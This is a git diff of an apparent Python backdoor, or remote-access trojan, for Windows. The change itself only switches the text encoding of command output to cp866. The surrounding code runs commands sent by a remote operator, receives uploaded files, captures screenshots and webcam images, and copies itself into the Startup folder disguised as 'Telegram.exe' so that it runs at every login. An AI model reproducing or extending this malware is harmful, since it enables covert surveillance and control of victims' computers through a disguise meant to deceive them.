@@ -56,7 +56,7 @@ class Backdoor:
             #     os.system(command)
 
             try:
-                res = subprocess.check_output(command, shell = True).decode('Windows-1251')
+                res = subprocess.check_output(command, shell = True).decode("cp866")
                 return res
             except Exception as err:
                 return str("[~] Check your commnad")
@@ -104,7 +104,7 @@ class Backdoor:
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
-                    username = subprocess.check_output("echo \%username%", shell = True).decode('Windows-1251')[1:-2:]
+                    username = subprocess.check_output("echo \%username%", shell = True).decode("cp866")[1:-2:]
                     path = f"C:\\Users\\{username}\\Documents"
                     cmd = f'del "{path}\\screen.png"'
                     
@@ -114,7 +114,7 @@ class Backdoor:
                     os.system(cmd)
 
                 elif command.split()[0] == "camera":
-                    username = subprocess.check_output("echo \%username%", shell = True).decode('Windows-1251')[1:-2:]
+                    username = subprocess.check_output("echo \%username%", shell = True).decode("cp866")[1:-2:]
                     path = f"C:\\Users\\{username}\\Documents"
                     cmd = f'del "{path}\\camera.jpg"'
                     try:
@@ -137,7 +137,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-username = subprocess.check_output("echo \%username%", shell = True).decode('Windows-1251')[1:-2:]
+username = subprocess.check_output("echo \%username%", shell = True).decode("cp866")[1:-2:]
 path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 command = f'copy Telegram.exe "{path}"'
 os.system(command)
